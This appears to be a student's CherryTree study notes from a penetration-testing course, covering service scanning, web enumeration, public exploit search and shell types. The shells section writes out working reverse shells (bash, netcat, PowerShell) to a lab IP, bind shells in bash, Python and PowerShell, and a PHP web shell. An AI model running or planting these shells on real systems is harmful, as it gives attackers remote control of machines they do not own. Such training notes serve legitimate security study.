<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="Academy Notes" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677630067" ts_lastsave="1677817215">
    <node name="Pentesting Basics" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677646155" ts_lastsave="1677779696">
      <node name="Service Scanning" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677630161" ts_lastsave="1677646448">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Nmap Scripts</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Go to scan:</rich_text>
        <rich_text>
		sudo nmap -sV -sC -p- 10.129.42.253

	</rich_text>
        <rich_text underline="single">Locate script by name</rich_text>
        <rich_text>:
		locate scripts/script-name

	</rich_text>
        <rich_text underline="single">Example:</rich_text>
        <rich_text>
		nmap --script smb-os-discovery.nse -p 445 10.10.10.10

</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">SMB</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Anonymous login</rich_text>
        <rich_text>:
		smbclient -N -L 10.10.10.10
		

	</rich_text>
        <rich_text underline="single">User login:</rich_text>
        <rich_text>
		smbclient -U bob \\\\10.10.10.10\\share
		
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">SNMP</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Default community strings (public / private):</rich_text>
        <rich_text>
		snmpwalk -v 2c -c public 10.129.42.254 1.3.6.1.2.1.1.5.0
	
		snmpwalk -v 2c -c private 10.129.42.253
	
	</rich_text>
        <rich_text underline="single">Bruteforce community string names:</rich_text>
        <rich_text>
		onesixtyone -c dict.txt 10.129.42.254</rich_text>
      </node>
      <node name="Web Enumeration" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677638570" ts_lastsave="1677646438">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Directory / File Enumeration:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">GoBuster:</rich_text>
        <rich_text>
		gobuster dir -u </rich_text>
        <rich_text link="webs http://10.10.10.121/">http://10.10.10.121/</rich_text>
        <rich_text> -w /usr/share/dirb/wordlists/common.txt
		
		gobuster dns -d host.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
		

</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Web Enumeration Tips:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text underline="single">Banner Grabbing / Web Server Headers:</rich_text>
        <rich_text>
			Web server headers provide a good picture of what is hosted on the web server. 
			
			</rich_text>
        <rich_text underline="single">Use curl to retreive server header information:</rich_text>
        <rich_text>
				curl -IL </rich_text>
        <rich_text link="webs https://www.target.com">https://www.target.com</rich_text>
        <rich_text>
				
				Date: Wed, 01 Mar 2023 04:13:20 GMT
				Server: Apache/2.4.29 (Ubuntu)
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/index.php/wp-json/">https://www.inlanefreight.com/index.php/wp-json/</rich_text>
        <rich_text>&gt;; rel="</rich_text>
        <rich_text link="webs https://api.w.org/">https://api.w.org/</rich_text>
        <rich_text>"
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7">https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7</rich_text>
        <rich_text>&gt;; rel="alternate"; type="application/json"
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/">https://www.inlanefreight.com/</rich_text>
        <rich_text>&gt;; rel=shortlink
				Content-Type: text/html; charset=UTF-8
	
	
		</rich_text>
        <rich_text underline="single">EyeWitness</rich_text>
        <rich_text> is another handly tool that can be used for web enumeration
		
	
		</rich_text>
        <rich_text underline="single">Whatweb:</rich_text>
        <rich_text>
			whatweb 10.10.10.121
			whatweb --no-errors 10.10.10.0/24
			
		
		</rich_text>
        <rich_text underline="single">SSL/TLS certificates:</rich_text>
        <rich_text>
			Browsing to </rich_text>
        <rich_text link="webs http://10.10.10.121">http://10.10.10.121</rich_text>
        <rich_text> and viewing the certificate reviels valuable information that can be used in a phishing attack.
			-&gt; Email address
			-&gt; Company name
			
		
		</rich_text>
        <rich_text underline="single">Robots.txt</rich_text>
        <rich_text>:
			robots.txt purpose is to instruct web crawlers which resources can and cannot be accessed for indexing.
			-&gt; can provide information such as locations and private files and admin pages.</rich_text>
      </node>
      <node name="Public Exploits" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677646134" ts_lastsave="1677646671">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Finding Public Exploits</rich_text>
        <rich_text>:

	</rich_text>
        <rich_text underline="single">install tools:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">sudo</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">apt</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">install</rich_text>
        <rich_text family="monospace"> exploitdb -y</rich_text>
        <rich_text>


	</rich_text>
        <rich_text underline="single">searchsploit:</rich_text>
        <rich_text>
		searchsploit openssh 7.2
		
		
	</rich_text>
        <rich_text underline="single">Online databases:</rich_text>
        <rich_text>
		Exploit DB  - </rich_text>
        <rich_text link="webs https://www.exploit-db.com/">https://www.exploit-db.com/</rich_text>
        <rich_text>
		Rapid7 DB -  </rich_text>
        <rich_text link="webs https://www.rapid7.com/db/">https://www.rapid7.com/db/</rich_text>
        <rich_text>
		Vulnerability Lab - </rich_text>
        <rich_text link="webs https://www.vulnerability-lab.com/">https://www.vulnerability-lab.com/</rich_text>
        <rich_text>
	
	
	</rich_text>
        <rich_text underline="single">Metasploit Primer:</rich_text>
        <rich_text>
		within msfconsole:
			msf6 &gt; search exploit eternalblue
			
			msf6 &gt; use exploit/windows/smb/ms17_010_psexec</rich_text>
      </node>
      <node name="Types of Shells" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677656044" ts_lastsave="1677657345">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Types of Shells:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Reverse shell:</rich_text>
        <rich_text>
		Most common type of shell. Victim connects back to host machine.
		
	</rich_text>
        <rich_text underline="single">Bind shell:</rich_text>
        <rich_text>
		Opens a port on the victims computer.
	
	</rich_text>
        <rich_text underline="single">Web shell:</rich_text>
        <rich_text>
		Shell where the communication happens over a web server through http requests. 
		
	

	
</rich_text>
        <rich_text underline="single" weight="heavy">Reverse shell commands:</rich_text>
        <rich_text>

	Bash:
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">bash</rich_text>
        <rich_text family="monospace"> -c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">rm</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">mkfifo</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">cat</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace">/bin/sh -i </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">2</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&amp;1</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">nc</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">10.10</rich_text>
        <rich_text family="monospace">.10.10 </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">1234</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace">/tmp/f


</rich_text>
        <rich_text>	Powershell:
	</rich_text>
        <rich_text family="monospace">powershell </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NoP </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NonI </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">W Hidden </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Exec Bypass </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Command </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Net</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Sockets</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">TCPClient</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">"10.10.10.10"</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">1234</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">GetStream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[byte[]]</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace"> = 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">..</rich_text>
        <rich_text family="monospace">65535</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">%</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">{</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">};</rich_text>
        <rich_text family="monospace" foreground="#ff7676">while</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">((</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Read</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">))</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-ne</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">){;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">TypeName System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Text</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">ASCIIEncoding</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetString</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">iex</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> 2&gt;&amp;1 </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Out-String</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace">  = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"PS "</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">pwd</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">Path </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"&gt; "</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[text.encoding]</rich_text>
        <rich_text family="monospace">::ASCII</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetBytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Write</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Flush</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()};</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Close</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Bind shell commands:</rich_text>
        <rich_text>
	Bash:
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">rm</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">mkfifo</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">cat</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace">/bin/bash -i </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">2</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&amp;1</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">nc</rich_text>
        <rich_text family="monospace"> -lvp </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">1234</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace">/tmp/f
</rich_text>
        <rich_text>
	Python:
		</rich_text>
        <rich_text family="monospace">python </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>
	Powershell:
		</rich_text>
        <rich_text family="monospace">powershell </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NoP </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NonI </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">W Hidden </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Exec Bypass </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Command </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#ff4545">[System.Net.Sockets.TcpListener]</rich_text>
        <rich_text family="monospace">1234</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">start</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">AcceptTcpClient</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">GetStream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[byte[]]</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace"> = 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">..</rich_text>
        <rich_text family="monospace">65535</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">%</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">{</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">};</rich_text>
        <rich_text family="monospace" foreground="#ff7676">while</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">((</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Read</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">))</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-ne</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">){;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">TypeName System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Text</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">ASCIIEncoding</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetString</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">iex</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> 2&gt;&amp;1 </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Out-String</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"PS "</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">pwd</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">Path </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">" "</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[text.encoding]</rich_text>
        <rich_text family="monospace">::ASCII</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetBytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Write</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Flush</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()};</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Close</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>

	Unlike a reverse shell, if we drop our connection to the target machine, we can connect back immediately without having to exploit the target again.
	-&gt; However if the host reboots, or the shell stops for any reason, we will have to execute the exploit again.
	



</rich_text>
        <rich_text underline="single" weight="heavy">Upgrading TTY:</rich_text>
        <rich_text>

	To have the accessibility you would on a normal shell through your connection, like accessing previous commands or scrolling up and down. 
	-&gt; We need to upgrade our TTY.
	
	</rich_text>
        <rich_text underline="single">Upgrade with python:</rich_text>
        <rich_text>
	
		Target Machine:
			</rich_text>
        <rich_text family="monospace">python -c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'import pty; pty.spawn("/bin/bash")'</rich_text>
        <rich_text>
			
		Local Machine:	
			</rich_text>
        <rich_text family="monospace">rottaj@htb[/htb]</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">$</rich_text>
        <rich_text family="monospace"> stty raw -echo
			rottaj@htb[/htb]</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">$</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">fg</rich_text>
        <rich_text>

		</rich_text>
        <rich_text underline="single">(Use Cntl + Z to background the shell - once we hit </rich_text>
        <rich_text underline="single" weight="heavy">fg</rich_text>
        <rich_text underline="single"> it will bring us back to the target shell)</rich_text>
        <rich_text>



</rich_text>
        <rich_text underline="single" weight="heavy">Web Shells:</rich_text>
        <rich_text>
	
	A web shell is typically a web script, PHP or ASPX that executes commands through HTTP requests and prints output back to the web page.
	
	</rich_text>
        <rich_text underline="single">PHP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&lt;?php</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">system</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace">$_REQUEST</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">[</rich_text>
        <rich_text family="monospace" foreground="#c4f465">"cmd"</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">]);</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">?&gt;</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>

